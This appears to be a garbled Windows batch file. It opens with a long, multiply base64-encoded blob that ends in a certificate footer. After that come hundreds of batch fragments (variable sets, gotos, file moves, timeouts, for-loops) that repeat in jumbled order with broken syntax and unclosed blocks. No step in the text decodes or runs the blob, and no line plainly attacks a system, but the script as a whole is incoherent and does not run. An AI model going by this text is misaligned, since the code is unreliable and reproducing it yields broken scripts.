pXVkVwdllrZEtTR1F5WkZGVk1FbDZXWHBLVDJWWFJsbFJha0paWVZSV2NWa3lNVmRoUjFKSVZtNWFXbUpZUW5OWFZFNVRXbFYwUkZOc2FGWk5helUxV1Zab1EwMUZlSFZVYlRsaFZqTm9lbE5YZHpCalJrSndVVmRzUzFkR2NETlhWbWhUWWpCd1YyUXllR3RpVkZadldXeGtWbUpGYkc1alIzaGFUVzFvTWxOVldtdGxiVVpIVkcwNVlWWXphSHBYUjJzeFpWZFNXRTVIWkVwaFZXeHdVMnhvWVdReGJGbFZiVGxMVm01a2MxcEdZekZoUjBwWVZsZDRTbUZWYkc1VFYyd3pXakF4UkdReVpHdFRSVzk0VjJ4Uk1Fc3diRVJUVjNoclltdEtiMXBGWkc1aVJtaEVWbXBLYVdKVldqQlhiRTVXWVZWT2RGWnRjR2hTZW1odVdYcEtWMDFGYkVkYVNIQm9VbXMxZGxkc1pEUmpNR3hGVFVka1ZXSlVhM2RaVldSelpGWndOazVEZEVwUk1HeHpXa2MxUTJGSFVraGFNbmhaVVRGWmVWbHRNVWRrUm5CVVZsZHNSR0Z0T0RKVFZWVjRZVWRGZVZaWFpHdFhSVXB5VjFab1UySkhUbkJSYld4YVYwWktjVmxWUm5kaVJtdDVZVWhhU2xKcVZrSlhiR1JQWWpKS05WRnVXbUZpVm10eVUxVk9TbUpIVW5WUmJXaHJVakprYzFkRlRsZE5WMHAwVW01U1lWVXhWbkJSTWpGWFlXMUdTRTlIWkZwTmJFWnVVMWRzVjAxdFRraFNha0pvVVRGV2NGVkhiekJhTUd4d1ZtcEthbEl3V1hkWlZVNVhXVEJ3V1ZadVZscFdla1p6VTJ4T1NsTXhjRmhVYlRscFpWVktTMVZ0YkVOU2JHUkdZa1pTVjFFd1JuQlRiR2hoWkRGc1dWVnRPVXRXYm1kM1YyeGplR1F3ZUhWVmFsSnJVVEJzYmxSWGR6QkxNVkp6Vm1zeFNsSXhTbk5aYTA1Q1lWVndXVmR1WkZwWFJrcDJVMnhhTkUxR2NGaE5XR1JOWW14Sk1GcEZUa3BMTVVKd1VWZHNTMWRHY0ROWFZtaFRZakJ3VjJReWVHdFdlbFp2V1d4a1ZtSkZiRzVqUjNoYVRXMW9NbE5WV1RCTE1WSnpWbXN4U2xJd1dYZGFSV2hMWTBac2NGRllVbWhSTUVaelYxY3dNV0ZIU2xoV1YzaFJZV3BTYmxOWGJGZE5iVTVJVW1wQ2FGRXhXbXBUYkdoWFpGWnNXRTFYZUV0Vk1HeE1WMnhrVDJJeVNqVlJiVlpSWVhwV1YxWkZUa05oUjFKSlZXNXNhRll3Ykc1VVJtUnVXakJ3V1ZadVZscFdla1p6VTJ4Uk1Fc3diRVJUVjNoclltdEtiMXBGWkc1aVJtaEVWbXBHYVdKVldqQlhiRTVXWVZWT2RGWnRjR2hTZW1odVYwZHZNVlF4V2xaa01tUmFWMFpKZDFreU1YTmhWV3hFVFZjNVNsRXhXWGxaYlRGSFpFWndWRlpUZEZGaFZVWndVMnhvWVdReGJGbFZiVGxMVm01a2MxcEdZekZoUjBwWVZsZDRTbG96UW5OWFZFcHZaR3RzU0ZScVJtcGlXR1J1VkVaTmVHVnRSbGhsUjNocFlteEdibFJHVFhoa2JWSlpWVzVrYTFkR1JtNVVSRXBUWWtkU2NFOVlWbXRXTTJoNlUxVk5lR1ZzYkhCUldGSk5WMFpLTlZkV1pFOWlSWGhZVW01d1drMXRlSGRUVlU1TFVXeHJlVlJ0ZUdwVFJrVXlVMVZvVTJKSFZrbFZXRnBxVWpOb2IxbFdZekJoVld4RVZtcEdhbEl4U205YVJXUlhUVmRPZEdReWVFcFNhbEZ5VTFWT1NtSkhVblZSYldoclVqSmtjMWRGYUZOaVIwcFpVVmhXYTFOSFozZFRWMjh3U3pCc1JGTlhlR3RpYTBwdldrVmtibUpHYUVSV2FrWnBZbFZhTUZkc1RsWmhWVTUwVm0xd2FGSjZhRzVVTWpWcll6RkNjVTVIWkVwaFZsbDVXVEJrUjAxSFJrUldiVTVMVjBaYU1WZFdZM2hpUlhCVVUxVjBZVll3TlhaWmJteERVMnhLY0ZGcldsaFNWM2hWVm10T1FtRlZjRmxYYm1SYVYwWktkbE5zV2pSTlJuQllUVmhrVFdKc1NUQmFSVTVLV2pGSmQwOVdWbFZsVlVsNlZGZHZNRXN3YkVSVFYzaHJZbXRLYjFwRlpHNWlSbWhFVm1wR2FXSlZXakJYYkU1V1lWVk9kRlp0Y0doU2VtaHVXa1ZrYzJSR2NGaFBWRVpyVVRCR01scEZUa0psUld4RlRrTjBTbEV3YkhOYVJ6VkRZVWRTU0ZveWVGbFJNVmw0V1cweFIyUkdjRlJXVjJ4RVlsWmFjVmxWWXpSYU1XOTVUMVJDYVdWVlNYcFphMUV3U3pCc1JGTlhlR3RpYTBwdldrVmtibUpHYUVSV2FrWnBZbFZhTUZkc1RsWmhWVTUwVm0xd2FGSjZhRzVVTWpWcVpWWkNjVTVIWkVwaFZsbDVXVEJrUjAxSFJrUldiVTVMVjBaYU1WZFdZM2hpUlhCVVUxVjBZVll3TlhaWmJteENaVlpvY1U1Vk9WZFdXR1J1VjJ0a1YyTXdiRVJXYld4cFlsVmFNRmRzVGxaTE1VSndVVmRzUzFkR2NETlhWbWhUWWpCd1YyUXllR3RXZWxadldXeGtWbUpGYkc1alIzaGFUVzFvTWxOVmFFdGlSMHB3VVdwQ1lWWjZSak5VUnpWVFRrZFNSRkZYZUZwaVZGWnZXV3hrVm1KR1FuRk9SMlJLWVZaWmVWa3daRWROUjBaRVZtMU9TMWRHV2pGWFZtTjRZa1Z3VkZOVmRHRldNRFYyV1c1c1ExTnNTbkJSYTFwWVVsZDRWVlpyVGtKaFZYQlpWMjVrV2xkR1NuWlRiRm8wVFVad1dFMVlaRTFpYkVrd1drVk9TbG93TVhOT1EzUlZZa1phVGxOVlpGTmlSMHBFVVZkc1MxZEdjRE5YVm1oVFlqQndWMlZFUW1GV2VrWXpWRWMxVTA1SFVrUlRVM1JSWVZWR2NGTnNhR0ZrTVd4WlZXMDVTMVp1WkhOYVJtTXhZVWRLV0ZaWGVFcGFNMEp6VjFSS2IyUnJiRWhUYm14aFZqQmFlVmRIYnpCaVIxSjBUbGRvYVZZeFZuTlZSMjh3V2pCc2NGWnFTbXBTTUZsM1dWVk9WMWt3Y0ZsV2JsWmFWbnBHYzFOc1RrcFRNWEJZVkcwNWFXVlZTbk5YVkVwdlpHdHNTVlJ0ZUd0Uk1FcFpXWHBLYjFaSFJraFdiazVwVVRCRk5WTlZhR3RsYkd0NlUyNUNhbE5HU214VVJ6RlBaVlp3V0ZKcVFtRldlbXh3V1ZjeFYyRnRVa2RPUnpsS1lrZFNWVmRVVGt0alIwNUpWVmhXYWsxdGFITlphMlF6WVZab2NHSkhWbEZoVlVad1UyeG9ZV1F4YkZsVmJUbExWbTVrYzFwSE1ERmhSMHBZVmxkNFNtRnFVWEpUVlU1S1lrZFNkVkZ0YUd0U01tUnpWMFZPVjAxWFNuUlNibEpoVlRGV2NGRXlNVmRoYlVaSVQwZGtZVll3TlhaWmJteERWMGROZVdGR1VtaFNNVnA2V1d0Wk1HUlhUblZXYmxaS1VUQnNjRk5YYkZkTmJVNUlVbXBDYUZFeFdtcFRiR1JMWkZac1dFMVhlRXRWTUd4d1UxVk9TbU13YkVWUldFNUtVMFpLTlZwR1pGZGFWa0p6VGtOMFNsRXdiSE5hUnpWRFlVZFNTRm95ZUZsUk1WbDVXVzB4UjJSR2NGUldWMnhSWVdwU2JsTlhiRmROYlU1SVVtcENhRkV4V21wVGJHaFhaRlpzV0UxWGVFdFZNR3hNVjJ4a1QySXlTalZSYlhoYVRXMW9NbE5WYUU5aVIxSkVVV3hvYWsxdGFGVlpWV1JYWXpKS1JGRlViRXBTVkZZeVdrVmtiMk5IU25SYVIxWlJZa1JSY2xOVlRrcGlSMUoxVVcxb2ExSXlaSE5YUlU1WFRXMUtkRkp1VW1GVk1WWndWVWR2TUZvd2JIQldha3BxVWpCWmQxbFZUbGRaTUhCWlZtNVdXbFo2Um5OVGJFNUtVekZ3V0ZSdE9XbGxWVW8yV2tWa1IyVlhVa1JSVjNocllsUldiMWxzWkZaaVJrSnhUa2RrU21GV1dYbFpNR1JIVFVkR1JGWnRUa3RYUmxveFYxWmplR0pGY0ZSVFZYUmhWakExZGxsdWJFTk5SMFpZVFZkNGFVMHhXWGRUVlZKR1dqRm9jVTVZVm10V00yTnlWVWRzUW1GVmNGbFhibVJhVjBaS2RsTnNXak5pUjFKWVRsZG9hVll4Vm5OVFYyUjNZa1pyZVdGSVdrcFNNSEExVjJ4a1IyTnNhSEZPUjNocllsUldiMWxzWkZaaVJrSnhUa2RrU21GV1dYbFpNR1JIVFVkR1JGWnRUa3RYUmxveFYxWmplR0pGY0ZSVFZYUmhWakExZGxsdWJFTmlSbXQ1WVVoYVNsTkZOWE5hUlU1RFYwZE5lV0ZHVW1oU01WcDZXV3RPUWs5VmJFbGFTSEJhVFRCd2Qxa3dhRk5hVlhoMFZHNXNZVll3V1hkWGJHTTFZVmRHZEZadGNHdFNhbEoyVTFkNGExWkdhM3BUYmtKcVUwWkdNVmw2U205aVIwcElaREpzV1dGWGVHeFZSMnhDWVZWd1dWZHVaRnBYUmtwMlUyeGFNMkpIVW5ST1YyaHBWakZXYzFOWGJ6QkxNR3hFVTFkNGEySnJTbTlhUldSdVlrWm9SRlpxUm1saVZWb3dWMnhPVm1GVlRuUldiWEJvVW5wb2JsZHNaRTlpTWtvMVVXeG9hazF0YUZWWlZXUlhZekpLUjA1SVZtcGliRm94VTFWT1NtRlZiSEJXYWtwcVVqQlpkMWxWVGxkWk1IQlpWbTVXV2xaNlJuTlRiRTVLWVZWc1JGTllUa3BTUlVaNlUxVm9VMlZYVWxoV2JWWlJZa1JSY2xOVlRrcGlSMUoxVVcxb2ExSXlaSE5YUlU1WFRXMUtkRkp1VW1GVk1WWndWVWR2TUZvd2JIQldha3BxVWpCWmQxbFZUbGRaTUhCWlZtNVdXbFo2Um5OVGJFNUtVekZ3V0ZSdE9XbGxWVXB6VjFSS2IyUnJiRWxVYlhoclVUQktXVmw2U205V1IwWklWbTVPYVZFd1JUVlRWVlV4WkcxU1NHRklRbWxpVjFKc1ZVZDNNRXN3YkVSVFYzaHJZbXRLYjFwRlpHNWlSbWhFVm1wS2FXSlZXakJYYkU1V1lWWkNjVTVIWkVwaFZsbDVXVEJrUjAxSFJrUldiVTVMVjBaYU1WZFdZM2hpUlhCVVUxVjBZVll3TlhaWmJteERXbFpDY2s1V1dsVlJNRXB2V2tWb1UyVlhSbGhUVjJSS1lWWlplVmt3WkVkTlIwWkVWbTFPUzFkR2NERlhWbU40WWtWd1ZGTlhaRXhOYldOeVZVZHNRbUZWY0ZsWGJtUmFWMFpLZGxOc1dqTmlSMUpZVGxkb2FWWXhWbk5UVjJSM1lrWnJlV0ZJV2twU2FsRnlWa2Q0VjFSVmJFaFNha0pyVTBWd2QxZFhiRUpoVlhCWlYyNWtXbGRHU25aVGJGb3pZa1pzZEU1WGFHbFdNVlp6VTFkc1FtTnRSa1ZPUTNSS1VUQnNjMXBITlVOaFIxSklXako0V1ZFeFdYaFpiVEZIWkVad1ZGWlhiRVJpVmxweFdWVmpORm94YUhGT1ZUbFhWbGhrYmxkV2FGTk5SMDUwWWtkc1NsRXdiSE5hUnpWRFlVZFNTRm95ZUZsUk1WbDRXVzB4UjJSR2NGUldWMnhLVVROU2RsVkhiekJhTUd4d1ZtcEthbEl3V1hkWlZVNVhXVEJ3V1ZadVZscFdla1p6VTJ4T1NsTXhiM2xQVkVKcFpWVktObGxVU25Oa01sSlpVVzEwV2xkR1NuTlhWRWsxWkZad2RHSkhOVVJoVjNSdVYyeGtOR1ZzY0ZSUlZ6bEtVakpTTWxwRll6UmFNa3AwVDFoc2FWWXdXbnBaTWpGWFlXMVNXVk51YkdoV2VsWjFVMVZPY2xNd09YUlZibHBwWW14S05WZHNZM2hrYlZKMFZtNVNZVlpGTVV4VU1qRlRaRzFLZFZWdWJHRldla1l5V2tjeFYyUkdjRkppZWxwcVRXNVNkMWt3YUZka01YQklVbXBDWVZZd05USlpiVEZoWTBad00ySjVkRlZpUmxwT1UxVmFUMkZ0UmtkVmJXaHFUVzVTTmxOVlRUVmhiVTUwVm0xb2ExSXhWbTVVUkVwYVdqQjNlbFJ0Y0VwUk1WbDZXVlZrVjJSVmNGUlJXRnByVW5wU2JsTlhiRmRXUm10NVlVZDRZVk5HV25wWGJGVXhZVWRLV0ZaWGVFcGhWVVl5V2tWb1Nsb3diSEJXYWtwcVVqQlpkMWxWVGxkWk1IQlpWMjVXV2xaNlJuTlRiRTVLVXpKR1dGZFhaR0ZYUlhBMVdXcE9TMk14Y0ZsWGJYaHBVVEJHTTFOVlRtOWxiSEJaVlZka1NtSnJjSE5YVkU1WFpWZE9kR0pJVm1GbGFrVjNXVEkxVjJKRmVFUlJWM2hyVFcxb2MxbHRiRlpoVlhSVVVXMTRhVk5GTlhOVFZVNXZaV3h3V1ZWWFpFcGlhM0J6VjFST1YyVlhUblJpU0ZaaFpXcEdkRmRXWkhOak1YQllWVmhPU2xFeFdYcFpWV1JYWkZWd1ZHUXlaR2hYUlRGdVdUQm9TMlJzYkhSU2JXeHBVMGQwYmxsV1l6RmhiVWw2VTI1c1lWWXdOSGRVUjJ4S1kwVk9jVTVWT1ZkV1dHUnVWMVpvVTAxSFRuUmlSMnhLVVRCc2MxcEhOVU5oUjFKSVdqSjRXVkV4V1hsWmJURkhaRVp3VkZaWGJFcFJNMUoyVVRKdk1WUXhXbFprTW1SYVYwWkpkMWt5TVhOaFZXeEVVMWQ0YTJKclNtOWFSV1J1WWtab1JGWnRiR2xpVlZvd1YyeE9WbUZWYkVSa1J6bEVZV3BXVUZac1ZqTmFNV3haVldwQ2FtSlhlSEJUVlU1S1lrZFNkVkZ0YUd0U01tUnpWMFZPVjAxWFNuUlNibEpoVlRGV2NGTlZUakJpTUU1MFZHcEdhbUpZWkc1VVJrMTRaVzFHV0dWSGVHbGliRVp1VkVaTmVHUnRVbGxWYm1SclYwWkdibFJFU2xOaVIxSndUMWhXYTFZemFIcFRWVTE0WTBWc1JFMVZiRXBSTUhCRFYxUktUMkpIVGtsVlZGcEtVakJhTTFrd1pEUmpSbXQ1VW1wQ2FGWjZiREZVUkVwM1pXMUplVTVIYkVwUmVrWktVMVZPUzFKSFNYbE9WRUpoVm5wVmQxUkdXbE5PVjA1SVZsUmFXbGRGU2pOWmEyUnpZV3hzV1ZWdVFtbE5hbEl5V1ZjMVQyUnRTbkJUVjJSTlZtMWtibFpWVlRWV1JscEVVVmhTVFZZeFNtOWFSV1JHV2pCc2RXUkhUa3BpVlRVeVdXMDFVMkpIU25WVmJVNUtZVzA1YmxkRlRrdGFNV3hJVVd0T1dsZEdTbkZaVlU1RFZrWnJlV0ZIZUdGVFJscDZWMnhrVWs1cmJFUldibXhoVmpBMGVGa3lOVXRqUjBwMFdUSjRXVko2Vm1sVmJHTXhZVEJzU0U5WE1VcFRSWEJ6V1RCak5XVlhVa2ROVjJSYVVqQkthbE5YTkhkaFZXeEVVVmQ0YTAxc1duQlpWV00xWkcxR05WWlZkR2hXTVd4dVdXMHdOVTFGYkVSVFYzaHRZbFpLTTFSVlRrcFBWa0pVVTFkNGEySnJTbTlhUldSdVlrWm9SRk5YWkV4UldFSnhWMVprTkdNd2JFVmpSM1JLVVRGc2JsZHNhRzlqUjFKRVVWaGFXbG95T0RKWGEwWjNaVzFTU0ZKdWJHdFJNRVl5VjFkc1FtRlZiSEJSYlhCcFZqRkdibFJFU2s1YU1ERnpUa04wVldKR1drNVRWV1JUWWtkS1JGRlhiRXRYUkZaMFZGVk9TbUpXY0ZsaFNFSnJVVEJHTWxkWFpIWmpSVTUwVm1wU2FGZEdSVGxKUXpCMFRGTXdkRkpWTlVWSlJVNUdWV3hTU2xKcmJFUlJWbEpHVEZNd2RFeFRNRDBnTFMwdExTMUZUa1FnUTBWU1ZFbEdTVU5CVkVVdExTMHRMUT09IC0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0= -----END CERTIFICATE-----
set "input=!input:~1!"
goto temp
set "input=%~1"
   if %ERRORLEVEL% EQU 1 goto w
cd.
   set /a "len+=%%A"
 set "len=0"
set "s=!s:~%% A!"
   set /A sample =1

   goto :eof
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
:evr
   move "%source%" "%s%"
   goto workdone
   goto :eof
 ELSE IF %F%==0 IF %C%==1
if "!input:~0,1!" equ "-"
   fc /l %comp1% %comp2%
goto endoftests
if 0==1 0
   set fi=%%~fG

move "%source%" "%fs%"
echo %%1=%1 %%2=%2 %%3=%3
::set "th=%~1"

cls
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)

   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
2>NUL Info > %temp%
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
set "hos=%~2"

   goto workdone
set F=%date%
   set /a "len+=%%A"
set wait=true
set "input=%~1"
echo %~n0 [RtnVar]

ELSE IF %F%==0 IF %C%==1
 set "len=0"
ELSE IF %F%==0 IF %C%==1
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
::set "th=%~1"
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
set /A md=2*%%A
set "s=!s:~%% A!"
   set wait=false
   echo %%1=%1 N=%N%
   set wait=false
cls
if 0==1 0
   set result=true

pause
)
   2>NUL Info > %temp%
   set /A md=2*%%A
   set "record=%~2"
   set /a "len+=%%A"
   if errorlevel 1 (@echo off) else
   ELSE IF %F%==1 IF %C%==0
IF %F%==1 IF %C%==1
   set /A sample =1
set "hos=%~2"
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
set "verp=%%~O"
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
   set "record=%~2"

set "us=/dR:% user %"
::set "th=%~1"
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
echo <wait>
   set fi=%%~fG

set /A md=2*%%A
   goto :eof
   set result=true
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
::set "th=%~1"
   set /a "len+=%%A"
   set wait=false
   if 0==1 0
   rem exit /b 0
set "[=rem/||(" & set "]=)"
:evr
   if 0==1 0
setlocal

   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)

set "c=%~2"
   goto :argPad
   if %ERRORLEVEL% EQU 1 goto w

ELSE IF %F%==0 IF %C%==1
cd.
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
set wait=true
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 

::set "th=%~1"
echo <wait>

pause
)

echo %~n0 [RtnVar]
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
echo %~n0 [RtnVar]
set "input=%~1"
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   set fi=%%~fG
endlocal & if "%~2" neq "" (set %~2=%result%) else echo %result%

   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
set "input=%~1"
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
set result=false
set "[=rem/||(" & set "]=)"
set "us=/dR:% user %"
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
   set /a "len+=%%A"
echo Started
move "%source%" "%fs%"
echo Started

   goto :argPad
   call
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
set "[:=goto :]%% "
   timeout /t 2 /nobreak > NUL
   set wait=false

   :: Fixed
   set result=true
echo <wait>
   echo %%1=%1 N=%N%
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )

ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
:evr
   2>NUL Info > %temp%
IF %F%==1 IF %C%==1
set "us=/dR:% user %"
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
set "us=/dR:% user %"
   set /A md=2*%%A
if "!input:~0,1!" equ "+" set "input = !input:~1!"
cd.
set "[=rem/||(" & set "]=)"
cd.
call ::insert %~1r %value%
set "[:=goto :]%% "
set "input=!input:~1!"
set F=%date%
   if 0==1 0

timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
ELSE IF %F%==0 IF %C%==1
call ::insert %~1r %value%
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
   goto workdone
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
if "!input:~0,1!" equ "-"
2>NUL Info > %temp%
set "[=rem/||(" & set "]=)"
echo %~n0 [RtnVar]

   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
ELSE IF %F%==0 IF %C%==1
echo %%1=%1 %%2=%2 %%3=%3
cd.
move "%source%" "%fs%"
ELSE IF %F%==0 IF %C%==1
   rem exit /b 0

call ::insert %~1r %value%
   set /a "len+=%%A"
set "input=!input:~1!"
call
   set fi=%%~fG
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
 ELSE IF %F%==0 IF %C%==1
   set /a "len+=%%A"
set "input=%~1"
   rem exit /b 0
cls
call ::insert %~1r %value%


pause
)
set F=%date%
   timeout /t 2 /nobreak > NUL

 set "len=0"
   rem exit /b 0
   if 0==1 0
set "us=/dR:% user %"
set "[:=goto :]%% "
cd.

setlocal
   :: Fixed
   echo %%1=%1 N=%N%
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   set /A md=2*%%A
goto endoftests
set "[=rem/||(" & set "]=)"
set "input=!input:~1!"
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
if "!input:~0,1!" equ "-"
cls
   set C=cls
   set "record=%~2"

   timeout /t 2 /nobreak > NUL
cd.
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)

pause
)
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
   fc /l %comp1% %comp2%
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
set "[:=goto :]%% "
set "c=%~2"
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
cd.
   if 0==1 0
IF %F%==1 IF %C%==1
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )

   set "record=%~2"
   :: Fixed
set "input=%~1"
   rem exit /b 0
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
   move "%source%" "%s%"
   call

   call
   echo %%1=%1 N=%N%
echo %%1=%1 %%2=%2 %%3=%3
set "input=!input:~1!"
set result=false
set "c=%~2"
   echo %%1=%1 N=%N%
if "!input:~0,1!" equ "+" set "input = !input:~1!"
IF %F%==1 IF %C%==1
   rem exit /b 0
2>NUL Info > %temp%

   rem Please wait
set "hos=%~2"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
cls
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
   2>NUL Info > %temp%

echo Started
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
set "s=!s:~%% A!"
set "input=!input:~1!"
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
endlocal & if "%~2" neq "" (set %~2=%result%) else echo %result%
set "verp=%%~O"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
   if errorlevel 1 (@echo off) else
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
   rem exit /b 0

   set /A sample =1
call ::insert %~1r %value%
:temp
exit
